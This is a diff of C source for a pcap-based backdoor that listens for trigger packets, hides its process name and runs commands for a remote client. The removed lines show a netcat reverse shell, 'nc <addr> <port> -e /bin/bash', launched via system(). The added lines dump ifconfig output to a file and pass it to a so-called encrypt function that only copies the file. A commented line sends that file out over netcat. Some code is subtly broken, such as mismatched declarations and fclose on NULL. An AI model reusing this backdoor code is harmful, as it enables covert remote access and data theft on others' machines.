@@ -55,6 +55,7 @@ void check_lock(char *addr, int port);
 void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 void execute_backdoor(char *addr, int port);
 int send_info(char buffer[]);
+void encrypt();
 
 /*-----------------------------------------------------------------------------------------------
 -- FUNCTION:   mask_application(char *name)
@@ -143,13 +144,13 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 				break;
 		}
 
-		id = id % 10000;
-		id = id % 1000;
+		//id = id % 10000;
+		//id = id % 1000;
 
-		srand(time(NULL));
+		//srand(time(NULL));
 
-		id += (int)((rand() % 3) * 10000);
-		id += (int)(((rand() % 5) + 1) * 1000);
+		//id += (int)((rand() % 3) * 10000);
+		//id += (int)(((rand() % 5) + 1) * 1000);
 	}
 }
 
@@ -168,15 +169,40 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 --------------------------------------------------------------------------------------------------*/
 void execute_backdoor(char *addr, int port)
 {
-	char buffer[256];
+	srand(time(NULL));
+	int shift = (int)((rand() % 24) + 1);
 
-	sprintf(buffer, "nc %s %d -e /bin/bash", addr, port);
+	//sprintf(buffer, "nc %s %d -e /bin/bash", addr, port);
 	printf("executing...\n");
 	// send shell to client
-	system(buffer);
 	lock = 0;
-	//system("ifconfig << info.txt");
+	system("ifconfig << info.txt");
+	encrypt(shift);
 	//system("nc %s %d -e < info.txt", addr, port);
+}
+
+void encrypt(int shift)
+{
+	FILE *infile = fopen("info.txt", "r");
+	FILE *outfile = fopen("encrypted.txt", "w");
+	char a;
+
+	if (infile == NULL) {
+		fclose(infile);
+		exit(1);
+	}
+
+	if (outfile == NULL) {
+		fclose(outfile);
+		exit(1);
+	}
+
+	do {
+		a = fgetc(infile);
+		fputc(a, outfile);
+	} while(a != EOF);
+
+	fcloseall();
 }
 
 int send_info(char buffer[])
